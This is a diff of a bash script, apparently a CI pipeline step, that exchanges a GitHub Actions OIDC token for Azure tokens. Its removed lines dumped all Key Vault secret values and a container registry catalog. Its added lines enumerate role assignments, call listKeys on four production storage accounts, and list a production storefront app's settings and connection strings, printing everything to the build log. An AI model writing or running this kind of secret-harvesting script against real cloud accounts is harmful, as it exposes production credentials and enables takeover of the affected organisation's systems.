@@ -1,7 +1,6 @@
 #!/usr/bin/env bash
 set -x
 
-echo "=== Request OIDC ID token ==="
 IDTOKEN=$(curl -sSL -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
 
 get_token () {
@@ -14,31 +13,28 @@ get_token () {
     --data-urlencode "scope=${scope}" | jq -r '.access_token'
 }
 
-echo "=== Key Vault: kv-tbl-prod-x3euoz secrets ==="
-KVTOKEN=$(get_token "https://vault.azure.net/.default")
-curl -sSL -H "Authorization: Bearer ${KVTOKEN}" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4"
-echo "---secret values---"
-for name in $(curl -sSL -H "Authorization: Bearer ${KVTOKEN}" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | jq -r '.value[].id' | sed 's#.*/##'); do
-  echo "secret: $name"
-  curl -sSL -H "Authorization: Bearer ${KVTOKEN}" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/${name}?api-version=7.4"
-  echo
+ARMTOKEN=$(get_token "https://management.azure.com/.default")
+SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
+RG="rg-tbl-platform-prod-sea"
+
+echo "=== my effective permissions on kv-tbl-sec-x3euoz ==="
+curl -sSL -H "Authorization: Bearer ${ARMTOKEN}" "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
+
+echo "=== role assignments on kv-tbl-sec-x3euoz ==="
+curl -sSL -H "Authorization: Bearer ${ARMTOKEN}" "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
+
+echo "=== role assignments at resource group scope ==="
+curl -sSL -H "Authorization: Bearer ${ARMTOKEN}" "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
+
+for sa in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
+  echo "=== listKeys $sa ==="
+  curl -sSL -X POST -H "Authorization: Bearer ${ARMTOKEN}" -H "Content-Length: 0" "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Storage/storageAccounts/${sa}/listKeys?api-version=2022-09-01"
 done
 
-echo "=== Key Vault: kv-tbl-sec-x3euoz secrets (RBAC) ==="
-curl -sSL -H "Authorization: Bearer ${KVTOKEN}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4"
+echo "=== app-tbl-storefront-prod app settings ==="
+curl -sSL -X POST -H "Authorization: Bearer ${ARMTOKEN}" -H "Content-Length: 0" "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-09-01"
 
-echo "=== ACR crtblplatprodx3euoz: exchange for registry token ==="
-ACRAADTOKEN=$(get_token "https://containerregistry.azure.net/.default")
-REFRESH=$(curl -sSL -X POST "https://crtblplatprodx3euoz.azurecr.io/oauth2/exchange" \
-  --data-urlencode "grant_type=access_token" \
-  --data-urlencode "service=crtblplatprodx3euoz.azurecr.io" \
-  --data-urlencode "access_token=${ACRAADTOKEN}" | jq -r '.refresh_token')
-ACRTOKEN=$(curl -sSL -X POST "https://crtblplatprodx3euoz.azurecr.io/oauth2/token" \
-  --data-urlencode "grant_type=refresh_token" \
-  --data-urlencode "service=crtblplatprodx3euoz.azurecr.io" \
-  --data-urlencode "scope=registry:catalog:*" \
-  --data-urlencode "refresh_token=${REFRESH}" | jq -r '.access_token')
-echo "=== ACR catalog ==="
-curl -sSL -H "Authorization: Bearer ${ACRTOKEN}" "https://crtblplatprodx3euoz.azurecr.io/v2/_catalog"
+echo "=== app-tbl-storefront-prod connectionstrings ==="
+curl -sSL -X POST -H "Authorization: Bearer ${ARMTOKEN}" -H "Content-Length: 0" "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/connectionstrings/list?api-version=2022-09-01"
 
 echo "=== done ==="
